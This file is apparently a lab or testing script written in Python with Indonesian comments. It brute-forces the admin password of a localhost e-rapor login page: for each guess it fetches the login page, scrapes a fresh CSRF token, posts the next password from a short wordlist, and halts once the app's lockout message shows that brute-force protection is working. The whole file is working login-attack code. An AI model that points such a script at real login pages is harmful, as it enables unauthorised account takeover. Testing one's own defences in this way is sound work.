import urllib.request
import urllib.parse
import http.cookiejar
import re
import time

print("=========================================")
print("😈 SCRIPT BRUTE-FORCE PROFESIONAL 😈")
print("Target: http://localhost/erapor/index.php")
print("=========================================\n")

# Siapkan Cookie Jar untuk menyimpan Session (PHPSESSID)
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

login_url = "http://localhost/erapor/index.php"
process_url = "http://localhost/erapor/proses_login.php"

username = "admin"
# Simulasi daftar kata sandi (wordlist) yang digunakan hacker
passwords = ["123456", "admin123", "password", "qwerty", "rahasia", "erapor2024", "admin"]

def get_csrf_token():
    """Hacker mengambil halaman login dulu untuk mencuri Token CSRF yang valid"""
    req = urllib.request.Request(login_url)
    try:
        response = opener.open(req)
        html = response.read().decode('utf-8')
        # Mencari nilai csrf_token dari HTML
        match = re.search(r'name="csrf_token" value="(.*?)"', html)
        if match:
            return match.group(1)
    except Exception as e:
        print(f"[-] Error mengambil token: {e}")
    return None

for i, pwd in enumerate(passwords):
    print(f"[*] Mencoba Password ke-{i+1}: {pwd}")
    
    # 1. Curi Token Baru (Karena CSRF dinamis per sesi/halaman)
    token = get_csrf_token()
    if not token:
        print("[-] Gagal mencuri token CSRF. Keluar.")
        break
    
    print(f"    [+] Token CSRF dicuri: {token[:10]}...")

    # 2. Siapkan data untuk dikirim (Eksploitasi)
    data = urllib.parse.urlencode({
        'csrf_token': token,
        'username': username,
        'password': pwd
    }).encode('utf-8')
    
    # 3. Kirim serangan POST ke proses_login.php
    req = urllib.request.Request(process_url, data=data)
    
    try:
        response = opener.open(req)
        response_url = response.geturl()
        
        # Jika berhasil login, biasanya akan teredirect ke dashboard
        if "dashboard" in response_url:
            print(f"\n[!!!] SUKSES! Password Ditemukan: {pwd} [!!!]")
            break
        else:
            # Jika kembali ke index.php, berarti gagal.
            # Kita baca isi halamannya untuk melihat error dari server
            html_result = response.read().decode('utf-8')
            if "Akun terkunci sementara" in html_result:
                print(f"    [x] SISTEM PERTAHANAN AKTIF! Akun terblokir (Brute-Force Protection Triggered!).")
                print("    [-] Hacker tidak bisa melanjutkan serangan. Aplikasi AMAN.\n")
                break
            else:
                print("    [-] Gagal. Password salah.")
                
    except Exception as e:
        print(f"[-] Error HTTP: {e}")
        
    time.sleep(0.5) # Jeda setengah detik antar serangan agar lebih realistis
